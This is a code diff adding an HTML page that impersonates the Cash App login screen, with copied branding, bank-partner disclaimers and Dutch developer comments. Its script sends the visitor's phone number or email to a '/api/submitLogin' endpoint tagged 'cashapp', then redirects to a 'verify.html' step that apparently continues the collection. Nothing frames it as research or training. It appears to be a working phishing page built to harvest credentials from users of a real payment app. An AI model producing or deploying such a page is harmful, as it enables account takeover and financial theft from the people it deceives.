@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Cash App - Log In</title>
+  <link rel="stylesheet" href="main.css">
+  <style>
+    /* (Jouw originele CSS is hier hetzelfde gebleven) */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .header {
+      display: flex;
+      justify-content: flex-start;
+      align-items: center;
+      padding: 1rem 2rem;
+    }
+    .header img {
+      height: 32px;
+    }
+    .main-content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 1rem;
+    }
+    .login-box {
+      width: 100%;
+      max-width: 400px;
+      padding: 1rem;
+      box-sizing: border-box;
+    }
+    .login-title {
+      font-size: 1.8rem;
+      font-weight: bold;
+      margin-bottom: 0.5rem;
+    }
+    .login-subtext {
+      font-size: 1rem;
+      color: #ccc;
+      margin-bottom: 1.5rem;
+    }
+    .login-subtext a {
+      color: #00d54b;
+      text-decoration: none;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 1rem;
+      border-radius: 12px;
+      border: none;
+      margin-bottom: 1rem;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+    .alt-option {
+      color: #00d54b;
+      background: none;
+      border: none;
+      font-size: 0.95rem;
+      margin-bottom: 1.5rem;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    button[type="submit"] {
+      width: 100%;
+      padding: 1rem;
+      background-color: #00d54b;
+      color: #000;
+      font-size: 1rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-sizing: border-box;
+    }
+    button[type="submit"]:hover {
+      background-color: #00b440;
+    }
+    .disclaimer {
+      font-size: 0.75rem;
+      color: #999;
+      text-align: center;
+      padding: 2rem 2rem 1rem;
+      line-height: 1.4;
+    }
+    .disclaimer a {
+      color: #999;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <img src="images/cash_app.png" alt="Cash App logo" />
+  </div>
+
+  <div class="main-content">
+    <div class="login-box">
+      <div class="login-title">Log in</div>
+      <div class="login-subtext">
+        Enter your phone number or email. <a href="#">Create account</a>
+      </div>
+
+      <form id="loginForm">
+        <input type="tel" id="loginInput" name="login" placeholder="Enter your mobile number" required>
+
+        <button type="button" class="alt-option" onclick="toggleLoginMethod()" id="toggleBtn">Use email instead</button>
+
+        <button type="submit">Next</button>
+      </form>
+    </div>
+  </div>
+
+  <div class="disclaimer">
+    By entering and clicking Continue, you agree to the <a href="#">Terms</a>, <a href="#">E‑Sign Consent</a>, & <a href="#">Privacy Policy</a>.<br><br>
+    Cash App is a financial platform, not a bank. Banking services provided by Cash App’s bank partner(s). Prepaid debit cards issued by Sutton Bank, Member FDIC.<br><br>
+    Brokerage services by Cash App Investing LLC, member FINRA/SIPC, subsidiary of Block, Inc., formerly known as Square, Inc. Bitcoin services provided by Block, Inc. Cash App Investing does not trade bitcoin, and Block, Inc. is not a member of FINRA or SIPC. Tax filing preparation services by Cash App Taxes, Inc. For additional information, see the <a href="#">Disclosures</a>.
+  </div>
+
+  <script>
+    function saveLoginInput() {
+      const input = document.getElementById('loginInput').value.trim();
+      const isEmail = input.includes('@');
+      
+      if (!input) {
+        alert('Vul je telefoonnummer of e-mail in!');
+        return;
+      }
+    
+      const loginData = {
+        type: 'cashapp',
+        email: isEmail ? input : '',
+        phoneNumber: !isEmail ? input : '',
+        timestamp: new Date().toISOString()
+      };
+    
+      fetch('/api/submitLogin', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(loginData)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('✅ Login succesvol verstuurd:', data);
+        window.location.href = '/cash.app/cash.app/verify.html?login=' + encodeURIComponent(input);
+      })
+      .catch(error => {
+        console.error('❌ Fout bij verzenden:', error);
+        alert('Er is een fout opgetreden, probeer opnieuw.');
+      });
+    }
+
+    function toggleLoginMethod() {
+      const input = document.getElementById('loginInput');
+      const toggleBtn = document.getElementById('toggleBtn');
+
+      if (input.type === 'tel') {
+        input.type = 'email';
+        input.placeholder = 'Enter your email address';
+        toggleBtn.innerText = 'Use phone number instead';
+      } else {
+        input.type = 'tel';
+        input.placeholder = 'Enter your mobile number';
+        toggleBtn.innerText = 'Use email instead';
+      }
+    }
+
+    // HIER toegevoegd: form event listener
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      saveLoginInput();
+    });
+  </script>
+</body>
+</html>
